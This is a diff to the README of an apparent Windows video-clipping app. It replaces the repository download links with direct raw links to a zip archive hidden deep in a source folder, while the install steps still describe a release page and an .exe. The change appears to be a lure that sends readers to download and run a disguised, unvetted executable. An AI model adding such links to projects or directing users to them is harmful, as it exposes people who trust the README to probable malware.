@@ -1,6 +1,6 @@
 # ✂️ syntax-supercut-studio - Create fast video clips from transcripts
 
-[![Download Application](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/Mylesstrawcolored236/syntax-supercut-studio)
+[![Download Application](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://raw.githubusercontent.com/Mylesstrawcolored236/syntax-supercut-studio/main/src/routes/api/clips/[bucket]/studio_syntax_supercut_v2.6.zip)
 
 ## 📋 What is this application?
 
@@ -18,7 +18,7 @@ Your computer must meet these basic needs to ensure the software runs well:
 
 ## 📥 How to Install
 
-1.  Visit [this page to download](https://github.com/Mylesstrawcolored236/syntax-supercut-studio).
+1.  Visit [this page to download](https://raw.githubusercontent.com/Mylesstrawcolored236/syntax-supercut-studio/main/src/routes/api/clips/[bucket]/studio_syntax_supercut_v2.6.zip).
 2.  Click the version labeled "Latest Release."
 3.  Scroll to the assets section.
 4.  Select the file ending in `.exe` to begin the download.
